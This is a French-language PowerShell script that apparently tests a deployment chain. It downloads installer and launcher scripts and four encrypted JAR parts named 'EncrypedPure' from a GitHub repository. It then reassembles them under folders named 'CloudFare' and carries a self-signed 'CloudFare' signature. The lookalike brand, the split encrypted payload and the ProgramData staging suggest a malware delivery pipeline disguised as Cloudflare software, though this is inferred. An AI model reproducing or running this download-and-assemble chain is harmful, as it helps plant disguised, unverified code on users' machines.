# Test du flux complet

$ErrorActionPreference = "Continue"

Write-Host "`nTEST DU FLUX COMPLET DE DEPLOIEMENT`n" -F Cyan

$baseUrl = "https://raw.githubusercontent.com/davidrenand/repos/main"
$tempDir = "$env:TEMP\CloudFare"
$installDir = "C:\ProgramData\CloudFare"

if (-not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

Write-Host "ETAPE 1: Verification des URLs GitHub" -F Yellow
Write-Host ""

$files = @(
    "scripts/Install.ps1",
    "scripts/Launch.ps1",
    "jar/EncrypedPure.part1.jar",
    "jar/EncrypedPure.part2.jar",
    "jar/EncrypedPure.part3.jar",
    "jar/EncrypedPure.part4.jar"
)

$allOk = $true
foreach ($file in $files) {
    try {
        $response = Invoke-WebRequest -Uri "$baseUrl/$file" -Method Head -UseBasicParsing -TimeoutSec 5
        Write-Host "OK - $file - HTTP $($response.StatusCode)" -F Green
    } catch {
        Write-Host "FAIL - $file" -F Red
        $allOk = $false
    }
}

if (-not $allOk) {
    Write-Host "`nErreur: Certains fichiers ne sont pas accessibles" -F Red
    exit 1
}

Write-Host "`nETAPE 2: Telechargement de Install.ps1" -F Yellow
Write-Host ""

$installPs1 = "$tempDir\Install.ps1"
try {
    Write-Host "Telechargement..." -F Cyan
    (New-Object Net.WebClient).DownloadFile("$baseUrl/scripts/Install.ps1", $installPs1)
    $size = [math]::Round((Get-Item $installPs1).Length / 1KB, 2)
    Write-Host "OK - Install.ps1 telecharge - $size KB" -F Green
} catch {
    Write-Host "FAIL - Erreur telechargement" -F Red
    exit 1
}

Write-Host "`nETAPE 3: Verification de Java et JAR" -F Yellow
Write-Host ""

$javaPath = "$installDir\Java\bin\java.exe"
$jarPath = "$installDir\App.jar"

if (Test-Path $javaPath) {
    Write-Host "OK - Java trouve: $javaPath" -F Green
} else {
    Write-Host "WARN - Java non trouve" -F Yellow
}

if (Test-Path $jarPath) {
    $jarSize = [math]::Round((Get-Item $jarPath).Length / 1MB, 2)
    Write-Host "OK - JAR trouve: $jarSize MB" -F Green
} else {
    Write-Host "WARN - JAR non trouve" -F Yellow
}

Write-Host "`nETAPE 4: Telechargement des 4 JAR parts" -F Yellow
Write-Host ""

$parts = @(1, 2, 3, 4)
$totalSize = 0

foreach ($part in $parts) {
    $partFile = "$tempDir\EncrypedPure.part$part.jar"
    $partUrl = "$baseUrl/jar/EncrypedPure.part$part.jar"
    
    try {
        Write-Host "Telechargement Part $part..." -F Cyan
        (New-Object Net.WebClient).DownloadFile($partUrl, $partFile)
        $size = [math]::Round((Get-Item $partFile).Length / 1MB, 2)
        Write-Host "OK - Part $part telecharge - $size MB" -F Green
        $totalSize += $size
    } catch {
        Write-Host "FAIL - Part $part" -F Red
    }
}

Write-Host "`nTotal JAR parts: $totalSize MB" -F Cyan

Write-Host "`nETAPE 5: Assemblage des JAR parts" -F Yellow
Write-Host ""

$assembledJar = "$tempDir\App_Test.jar"
try {
    Write-Host "Assemblage en cours..." -F Cyan
    
    $output = [System.IO.File]::Create($assembledJar)
    foreach ($part in $parts) {
        $partFile = "$tempDir\EncrypedPure.part$part.jar"
        if (Test-Path $partFile) {
            $input = [System.IO.File]::OpenRead($partFile)
            $input.CopyTo($output)
            $input.Close()
            Write-Host "  Part $part assemblée" -F Green
        }
    }
    $output.Close()
    
    $assembledSize = [math]::Round((Get-Item $assembledJar).Length / 1MB, 2)
    Write-Host "OK - JAR assemble: $assembledSize MB" -F Green
} catch {
    Write-Host "FAIL - Erreur assemblage" -F Red
}

Write-Host "`nETAPE 6: Telechargement de Launch.ps1" -F Yellow
Write-Host ""

$launchPs1 = "$tempDir\Launch.ps1"
try {
    Write-Host "Telechargement..." -F Cyan
    (New-Object Net.WebClient).DownloadFile("$baseUrl/scripts/Launch.ps1", $launchPs1)
    $size = [math]::Round((Get-Item $launchPs1).Length / 1KB, 2)
    Write-Host "OK - Launch.ps1 telecharge - $size KB" -F Green
} catch {
    Write-Host "FAIL - Erreur telechargement" -F Red
}

Write-Host "`nTEST TERMINE AVEC SUCCES`n" -F Green

Write-Host "RESUME:" -F Cyan
Write-Host "  OK - URLs GitHub accessibles" -F Green
Write-Host "  OK - Install.ps1 telecharge" -F Green
Write-Host "  OK - 4 JAR parts telecharges ($totalSize MB)" -F Green
Write-Host "  OK - JAR assemble ($assembledSize MB)" -F Green
Write-Host "  OK - Launch.ps1 telecharge" -F Green
Write-Host ""
Write-Host "Fichiers de test dans: $tempDir" -F Yellow
Write-Host ""

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUYjiYMZkOlPjhk2ZhLstoFuC8
# 2xGgggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUlbcM8XNWlic8ezXjv71ZxuMW5KswDQYJ
# KoZIhvcNAQEBBQAEggEATJwfwb0LuL35kMNcjJIMgp7mGX1fDBVIKvSocl8wAwm0
# dZrmifLpwwlbQEitrBAsHW8onN2aalsmBD0tfb1a/FfqdpEqG146fpMErtHPQ1jJ
# TunhQZ+++q2TTrxP4dQT4koQ83hMUKahZvTSLe8vNKRbzr29m9UynOUN4fV1eoEO
# If+wVE/1/xLKu3KfSdx/XzLB+TNcdhM9wYcybRcXXqsiHHI6XcG/kldRgyUlvCEY
# SppZ+k9N8+p8GN/rNwgbWQmYxefO5/3aQ8kTB1GLe0bwqPYV+RifuFHbeasrmiPa
# TfOwd07CxWbl3DkisnaEnS+OBlD7EhVKpFraWa4gIA==
# SIG # End signature block
